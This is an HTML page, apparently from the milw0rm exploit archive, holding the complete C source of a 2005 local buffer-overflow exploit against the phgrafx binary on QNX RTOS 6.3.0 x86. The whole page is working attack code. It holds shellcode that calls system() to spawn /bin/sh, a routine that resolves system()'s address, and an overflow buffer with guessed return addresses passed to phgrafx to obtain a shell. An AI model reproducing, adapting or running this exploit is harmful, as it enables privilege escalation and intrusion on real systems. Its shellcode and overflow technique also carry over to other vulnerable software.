<html><head><title>QNX RTOS 6.3.0 (phgrafx) Local Buffer Overflow Exploit (x86)</title></head><pre>/*
 * minervini@neuralnoise.com (c) 2005, all rights reserved.
 * sample exploit for phgrafx on QNX 6.3.0 x86
 *
 * tested on: QNX qnx 6.3.0 2004/04/29-21:23:19UTC x86pc x86
 */

#include &lt;sys/types.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;dlfcn.h&gt;
#include &lt;unistd.h&gt;
#include &lt;err.h&gt;

#ifndef _PATH
# define _PATH (&quot;/usr/photon/bin/phgrafx&quot;)
#endif

#ifndef _RET_INIT
# define _RET_INIT (864)
#endif

/* thanks to my friend pi3 that suggested me to call a libc
 * function to make the shellcode way shorter than it was */

char scode[] = &quot;\x31\xc0&quot;      // xor    %eax,%eax
 &quot;\x50&quot;                        // push   %eax
 &quot;\x68\x2f\x2f\x73\x68&quot;        // push   $0x68732f2f
 &quot;\x68\x2f\x62\x69\x6e&quot;        // push   $0x6e69622f
 &quot;\x54&quot;                        // push   %esp
 &quot;\xbb\xEF\xBE\xAD\xDE&quot;        // mov    $0xDEADBEEF,%ebx
 &quot;\xff\xd3&quot;;                   // call   *%ebx

unsigned long get_sp (void) {
  __asm__ (&quot;movl %esp, %eax&quot;);
}

int main (int argc, char **argv) {

  int i, slen = strlen (scode), offset = 0;
  long ptr, *lptr, addr;
  char *buf;
  void *handle;

  handle = dlopen (NULL, RTLD_LAZY);
  addr = (long) dlsym (handle, &quot;system&quot;);

  for (i = 0; i &lt; 4; i++) {
     char temp = (*((char *) &amp;addr + i) &amp; 0xff);
     if (temp == 0x00 || temp == 0x09 || temp == 0x0a) {
        puts
          (&quot;currently system()'s address contains bytes like 0x00, 0x09 or 0x0a, so it probably won't work since&quot;
           &quot; the application seems to truncate those bytes. BTW you can rely on functions like exec*(), spawn*()&quot;
           &quot; or MsgSend*() to get this working.\n&quot;
           &quot;more at http://www.qnx.org/developers/docs/momentics621_docs/neutrino/lib_ref/&quot;);
        return (-1);
     }
  }

  memcpy((char *)&amp;scode + 0xf, &amp;addr, 4);

  if (argc &gt; 1)
    offset = strtoul(argv[1], NULL, 0);

  if (!(buf = (char *) malloc(1032)))
    err(1, &quot;malloc()&quot;);

  memset(buf, 0, 1032);

  for (i = 0; i &lt; (_RET_INIT - slen); i++)
    buf[i] = 'A'; // inc %ecx

  printf(&quot;shellcode length: %d\n&quot;, slen);

  for (i = (_RET_INIT - slen); i &lt; _RET_INIT; i++)
    buf[i] = scode[i - (_RET_INIT - slen)];

  lptr = (long *) (buf + _RET_INIT);

  printf(&quot;address: 0x%lx\n&quot;, ptr = (get_sp () - offset));

  for (i = 0; i &lt; ((1024 - _RET_INIT) / 4); i++)
    *(lptr + i) = (int) ptr;

  execl(_PATH, &quot;phgrafx&quot;, buf, NULL);

  return (0);
}

// milw0rm.com [2005-11-30]</pre></html>